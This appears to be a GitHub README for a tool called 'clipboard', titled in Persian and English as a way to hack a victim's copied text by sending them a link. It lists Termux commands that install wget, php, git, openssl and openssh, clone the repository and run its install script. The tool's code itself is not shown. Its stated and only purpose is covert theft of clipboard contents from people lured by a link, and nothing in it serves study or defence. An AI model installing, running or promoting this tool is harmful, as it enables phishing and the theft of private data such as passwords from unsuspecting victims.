# clipboard

<h3> هک متن کپی شده در کیبورد قربانی با ارسال لینک - Hack victim copy text by sending link <h3>

کد های اجرا در ترموکس: 
<pre><code>apt update<br>
apt upgrade<br>
pkg  install  wget  php  git openssl  openssh<br>
git clone https://github.com/HACKGM/clipboard<br>
cd clipboard<br>
bash install.sh<code><pre>
